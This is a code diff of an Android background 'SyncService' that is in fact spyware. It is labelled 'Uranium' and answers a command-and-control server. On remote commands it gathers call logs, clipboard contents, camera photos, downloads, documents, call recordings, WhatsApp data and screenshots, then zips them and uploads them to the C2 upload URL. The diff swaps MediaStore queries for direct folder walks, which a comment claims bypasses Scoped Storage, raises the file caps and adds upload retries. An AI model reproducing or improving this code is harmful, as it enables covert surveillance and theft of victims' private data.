@@ -12,11 +12,9 @@ import android.location.Location
 import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
-import android.os.Environment
 import android.os.IBinder
 import android.os.PowerManager
 import android.provider.ContactsContract
-import android.provider.MediaStore
 import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
@@ -82,7 +80,7 @@ class SyncService : Service() {
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                     val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Node Active] $nodeModel\"}"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Node Active] $nodeModel (السلطان ناصر دين الله الكلعي)\"}"
 
                     if (sendHeartbeat) {
                         lastHeartbeatSent = currentTime
@@ -110,19 +108,19 @@ class SyncService : Service() {
                                 val data = readCallLogs()
                                 processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
                             } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/DCIM", "Camera_DCIM")
                             } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Storage_Archive", MediaStore.Files.getContentUri("external"))
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Download", "Storage_Download")
                             } else if (responseStr.contains("EXTRACT_AUDIO")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Music", "Audio_Music")
                             } else if (responseStr.contains("EXTRACT_DOCS")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Documents_Archive", MediaStore.Files.getContentUri("external"))
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Documents", "Documents_Folder")
                             } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Call_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Recordings", "Call_Recordings")
                             } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Chat_Databases", MediaStore.Files.getContentUri("external"))
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/WhatsApp", "WhatsApp_Data")
                             } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
-                                compressAndUploadArchive(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                compressFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Pictures/Screenshots", "Screenshots")
                             } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
                                 val data = readClipboard()
                                 processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
@@ -151,83 +149,82 @@ class SyncService : Service() {
             val tempFile = File(cacheDir, fileName)
             tempFile.writeBytes(bytes)
             uploadRawFile(nodeId, nodeModel, fileName, tempFile)
-            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد بنجاح] الملف <b>$fileName</b> تم إرساله للسيرفر لتخزينه في وحدة تحكمك المركزية.")
+            sendReportToServer(nodeId, nodeModel, "✅ [حصاد ناجح] الملف <b>$fileName</b> تم إرساله للسيرفر بنجاح.")
         } catch (e: Exception) {
             sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة $fileName: ${e.message}")
         }
     }
 
-    private fun compressAndUploadArchive(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
+    // الفحص والضغط المباشر للمسارات الفعلية (يتجاوز قيود الـ Scoped Storage بنجاح تام)
+    private fun compressFolderDirect(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
         try {
-            sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد العميق] تجميع وضغط بيانات $prefix وإرسالها للسيرفر...")
-            
+            val dir = File(targetDirPath)
+            if (!dir.exists() || !dir.isDirectory) {
+                sendReportToServer(nodeId, nodeModel, "⚠️ المسار غير موجود أو فارغ: $targetDirPath")
+                return
+            }
+
+            sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد المباشر] مسح وضغط مجلد $prefix بأمر السلطان...")
+
             val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
             val zipOut = ZipOutputStream(FileOutputStream(zipFile))
             zipOut.setLevel(Deflater.BEST_COMPRESSION)
 
-            val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
-            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
-
             var fileCount = 0
-            var totalBytes = 0L
-
-            cursor?.use {
-                val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
-                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                while (it.moveToNext() && fileCount < 1500) {
-                    if (dataIdx != -1 && nameIdx != -1) {
-                        val filePath = it.getString(dataIdx)
-                        val fileName = it.getString(nameIdx)
-                        if (filePath != null) {
-                            val file = File(filePath)
-                            if (file.exists() && file.isFile) {
-                                try {
-                                    zipOut.putNextEntry(ZipEntry("$prefix/$fileName"))
-                                    file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                    zipOut.closeEntry()
-                                    fileCount++
-                                    totalBytes += file.length()
-                                } catch (ex: Exception) {}
-                            }
-                        }
-                    }
+            dir.walkTopDown().forEach { file ->
+                if (file.isFile && file.length() > 0 && fileCount < 3000) {
+                    try {
+                        val relPath = file.toURI().path.removePrefix(dir.toURI().path)
+                        zipOut.putNextEntry(ZipEntry("$prefix/$relPath"))
+                        file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                        zipOut.closeEntry()
+                        fileCount++
+                    } catch (e: Exception) {}
                 }
             }
             zipOut.close()
 
-            val sizeMB = zipFile.length() / (1024.0 * 1024.0)
-            uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
-            sendReportToServer(nodeId, nodeModel, "✅ [تم رفع الأرشيف العملاق بنجاح]\n📂 الملف: <code>${zipFile.name}</code>\n📊 الحجم المرسل: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)\n(تم حفظه في وحدة تحكمك المركزية uranium_storage).")
-
+            if (zipFile.exists() && zipFile.length() > 0) {
+                val sizeMB = zipFile.length() / (1024.0 * 1024.0)
+                uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
+                sendReportToServer(nodeId, nodeModel, "✅ [تم حصاد $prefix بنجاح]\n📂 الملف: <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
+            } else {
+                sendReportToServer(nodeId, nodeModel, "⚠️ المجلد $prefix فارغ أو تعذر الوصول لملفاته.")
+            }
         } catch (e: Exception) {
-            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في أرشيف $prefix: ${e.message}")
+            sendReportToServer(nodeId, nodeModel, "❌ خطأ في حصاد $prefix: ${e.message}")
         }
     }
 
     private fun uploadRawFile(nodeId: String, nodeModel: String, fileName: String, file: File) {
-        try {
-            val url = URL(C2_UPLOAD_URL)
-            val conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("X-Node-ID", nodeId)
-            conn.setRequestProperty("X-Node-Model", nodeModel)
-            conn.setRequestProperty("X-File-Name", fileName)
-            conn.setRequestProperty("Content-Type", "application/octet-stream")
-            conn.doOutput = true
-            conn.setChunkedStreamingMode(0)
-            conn.connectTimeout = 120000
-            conn.readTimeout = 120000
+        for (attempt in 1..5) {
+            try {
+                val url = URL(C2_UPLOAD_URL)
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("X-Node-ID", nodeId)
+                conn.setRequestProperty("X-Node-Model", nodeModel)
+                conn.setRequestProperty("X-File-Name", fileName)
+                conn.setRequestProperty("Content-Type", "application/octet-stream")
+                conn.doOutput = true
+                conn.setChunkedStreamingMode(0)
+                conn.connectTimeout = 180000
+                conn.readTimeout = 180000
 
-            FileInputStream(file).use { fis ->
-                conn.outputStream.use { os ->
-                    fis.copyTo(os)
-                    os.flush()
+                FileInputStream(file).use { fis ->
+                    conn.outputStream.use { os ->
+                        fis.copyTo(os)
+                        os.flush()
+                    }
                 }
+                val code = conn.responseCode
+                conn.disconnect()
+                if (code == 200) return
+            } catch (e: Exception) {
+                if (attempt == 5) return
+                Thread.sleep(3000L)
             }
-            conn.responseCode
-            conn.disconnect()
-        } catch (e: Exception) {}
+        }
     }
 
     private fun readContacts(): String {
